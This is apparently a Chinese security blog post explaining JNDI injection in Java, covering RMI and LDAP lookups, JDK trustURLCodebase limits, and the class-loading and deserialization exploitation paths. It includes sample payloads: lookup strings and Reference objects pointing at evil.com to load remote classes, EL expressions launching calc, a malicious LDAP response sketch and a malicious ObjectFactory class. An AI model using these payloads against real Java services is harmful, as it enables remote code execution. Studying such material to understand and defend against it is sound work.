---
title: JNDI注入
author: Creexile
date: 2026-07-20 17:04:57
lastMod: 2026-08-12
summary: ''
cover: ''
category: 'Java'
draft: false
comments: false
sticky: 0
tags:
  - Java安全
  - Java
  - JNDI注入
---

[Java反序列化核心组件](./java反序列化核心组件)

# 介绍

RMI注入, LDAP注入可以统称为JNDI注入, RMI和LDAP是具体的服务提供者或通信协议, 而JNDI是一个统一的API接口

- JNDI注入是指利用了JNDI服务在查找(`lookup`)外部资源时的机制缺陷的攻击方式, 攻击者通过控制 `lookup()` 的参数, 注入恶意的RMI或LDAP服务地址
- RMI注入指攻击者利用JNDI接口, 通过RMI协议加载远程恶意对象
- LDAP注入指攻击者利用JNDI接口, 通过LDAP协议从远程目录服务获取并加载恶意对象

# JDNI

JNDI(Java Naming and Directory Interface)是Java平台的核心服务接口, 提供**统一的命名和目录访问能力**, 允许Java应用程序通过标准化API访问各种命名和目录服务

本质就是通过名字找到对应的对象

## lookup()

JNDI注入的关键点是`javax.naming.Context.lookup()`方法

当JNDI的Provider URL可控时, 攻击者可以传入恶意的远程地址, 触发以下流程

1. 用户构造输入使得执行`lookup("ldap://evil.com/Exploit")`
2. JNDI Manager 解析URL
3. 连接远程LDAP/RMI服务器, 获取远程对象引用
4. 本地实例化 -> 代码执行

```java
// 漏洞代码
Hashtable env = new Hashtable();
env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");

env.put(Context.PROVIDER_URL, userInput);  // ← 用户可控

Context ctx = new InitialContext(env);
Object obj = ctx.lookup(userInput);  // ← 触发远程加载
```

共同的部分结束了, 下面介绍两种注入

| 协议     | 默认端口 | 传输方式 | 返回类型             | 跨语言          |
| -------- | -------- | -------- | -------------------- | --------------- |
| Java RMI | 1099     | JRMP     | Reference/Remote对象 | 仅Java          |
| LDAP     | 389/636  | TCP      | Reference/序列化对象 | 允许,利用需Java |

- Java RMI (Remote Method Invocation)
- LDAP (Lightweight Directory Access Protocol)
- JRMP (Java Remote Method Protocol)

这张图显示在Java版本中可用的JNDI方法

## RMI注入

### 底层流程

```
1. 用户构造输入使得执行lookup("rmi://evil.com:1099/Exploit")
2. `RMI Registry.lookup("Exploit")` → 返回 Stub 对象
3. 如果返回的是 Reference 对象：`Reference.getFactoryClassLocation()` → 获取工厂类地址     
4. 从远程HTTP/FTP服务器加载class文件
5. ClassLoader加载并实例化 -> 代码执行
```

RMI Reference注入的Reference对象结构

```java
Reference ref = new Reference(    
  "javax.el.ELProcessor",           // className: 目标工厂类    
  "javax.el.ELProcessor",           // factory: 工厂类    
  "http://evil.com:8080/"           // factoryLocation: 远程类加载地址
);
```

### 版本限制

1. JDK < 6u132 / 7u122 / 8u113

RMI Reference注入完全无限制

2. JDK 6u132 / 7u122 / 8u113

新增`com.sun.jndi.rmi.object.trustURLCodebase`属性(默认true)，RMI-JNDI注入仍可用

3. JDK >= 6u141 / 7u131 / 8u121

`trustURLCodebase` 默认改为false，RMI Reference远程类加载被封,
但可以通过`System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true")`重新开启

## LDAP注入

### 原理

```
1. 受害者 lookup("ldap://evil.com:1389/Exploit")
2. LDAP Server 返回 SearchResultEntry
3. JNDI 解析 LDAP 响应中的 javaClassName / javaCodeBase / javaFactory
4. 从 javaCodeBase (远程HTTP) 加载 javaFactory 类
5. 工厂类实例化 -> 代码执行
```

LDAP服务器返回的数据结构

```
LDAP Search Result Entry: 
  - javaClassName: javax.el.ELProcessor    (目标类) 
  - javaCodeBase:  http://evil.com:8080/   (远程类路径) 
  - javaFactory:   Exploit                 (工厂类名) 
  - objectClass:   javaNamingReference
```

### 版本限制

1. JDK < 6u211 / 7u201 / 8u191 / 11.0.1

LDAP Reference利用完全可用(包括远程类加载)

2. JDK >= 6u211 / 7u201 / 8u191 / 11.0.1

`com.sun.jndi.ldap.object.trustURLCodebase` 默认改为false，LDAP Reference远程类加载被封禁

但在高版本JDK中，如果目标classpath中存在可利用的Gadget类，仍然可以通过LDAP反序列化(javaSerializedData)触发RCE

# 攻击路径

JNDI注入最终实现代码执行其实有两条路径, 为反序列化和类加载

## 类加载

这是JNDI注入的经典利用方式, 不依赖反序列化; 根据JDK版本不同, 又分为远程类加载和本地类加载

远程类加载(JDK < 8u191，trustURLCodebase=true)

```
1. lookup("ldap://evil.com/Evil")
2. LDAP返回 Reference(className, factory, factoryLocation)
3. JNDI NamingManager.getObjectInstance()
4. URLClassLoader 从 factoryLocation(远程URL)加载 factory 类
5. factory.getObjectInstance() 被调用
6. 代码执行(如 EL表达式执行 / 命令执行)
```

本地类加载(JDK ≥ 8u191，trustURLCodebase=false)

```
1. lookup("ldap://evil.com/Evil")
2. LDAP返回 Reference(className, factory, factoryLocation=null)
3. JNDI NamingManager.getObjectInstance()
4. 从目标本地classpath中查找 factory 类(如Tomcat自带的BeanFactory)
5. factory.getObjectInstance() 被调用
6. 代码执行(借助本地可利用的Factory链，如BeanFactory + ELProcessor)
```

低版本JDK允许从远程URL加载工厂类(远程类加载)，高版本JDK封堵远程URL后，攻击者只能利用目标classpath中已有的工厂类

> 表达式语言(Expression Language, EL)是专为Java Web应用设计的简化脚本语言, 用于替代繁琐的 Java 代码片段; 但EL 3.0规范引入的`javax.el.ELProcessor`等API使其能在独立Java环境中动态执行任意表达式, 一旦输入可控, 攻击者可以利用它执行恶意表达式

本地类加载+EL表达式典型利用链:

```java
// 普通的
ELProcessor.eval(  
  "\"\".getClass()" +
  ".forName(\"javax.script.ScriptEngineManager\")" +
  ".newInstance()" +
  ".getEngineByName(\"JavaScript\")" +
  ".eval(\"new java.lang.ProcessBuilder('cmd','/c','calc').start()\")"
);

// 反射的
// LDAP服务器端返回的Reference（高版本JDK，javaCodeBase必须为null）
Reference ref = new Reference(    
  "javax.el.ELProcessor",   // 目标类(Tomcat等自带的类)
  "javax.el.ELProcessor",   // 工厂类(必须在目标classpath中) 
  null   // factoryLocation = null，不加载远程类
);

// 利用 javax.el.ELProcessor 执行命令（通过Tomcat的EL引擎）
"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd','/c','calc']).start()")
```

## 反序列化

当trustURLCodebase=false且本地无可利用的Factory类时, 攻击者可使用反序列化这条路径; 此路径与`javaCodeBase`完全无关，直接通过`javaSerializedData`属性传递序列化的Gadget对象

```
1. lookup("ldap://evil.com/Evil")
2. LDAP返回序列化的恶意对象(如 CommonCollections Gadget)
3. JNDI 检测到 javaSerializedData 属性 -> 反序列化
4. 反序列化触发Gadget链 -> 代码执行
```

LDAP Server 返回序列化对象的实现

```java
// LDAP服务器端代码示例
public void sendSerializedResult(LdapResult result, String dn{
  Object evilObj = generateGadgetChain(); // 如CC链、CB链等   
  result.addAttribute("javaSerializedData", serialize(evilObj)); 
  result.addAttribute("javaClassName", "Exploit");    
  // 反序列化路径：只需要 javaSerializedData + javaClassName, 不需要 javaCodeBase 和 javaFactory（这两个是Reference路径的参数）
  // result.addAttribute("javaCodeBase", "http://evil.com/");
  // result.addAttribute("javaFactory", "Exploit");
}
```

> 反序列化路径在高版本JDK下之所以有效，正是因为它不依赖`javaCodeBase`

要求`javaSerializedData`和`javaClassName`的属性存在, 有可用的Gadget链, 至于类的黑白名单那就看你能不能绕过了

恶意类可以选择JNDI调用时执行或类加载时立即执行

```java
public class Exp implements javax.naming.spi.ObjectFactory {
  static {
    // 静态代码, 类加载时执行
    try {
      Runtime.getRuntime().exec("calc.exe");
    }catch{
      e.printStackTrace();
    }
  }

  public Object getObjectInstance(Object obj, Name name, Context ctx, Hashtable<?, ?> env) throws Exception {
    // getObjectInstance() JDNI调用时执行
    Runtime.getRuntime().exec("calc.exe");
    return null;
  }

}
```

参考文章

1. [知乎-从Fastjson和Log4j2学习JNDI注入](https://zhuanlan.zhihu.com/p/526979299)
2. [先知-JNDI注入原理及利用](https://xz.aliyun.com/news/6237)
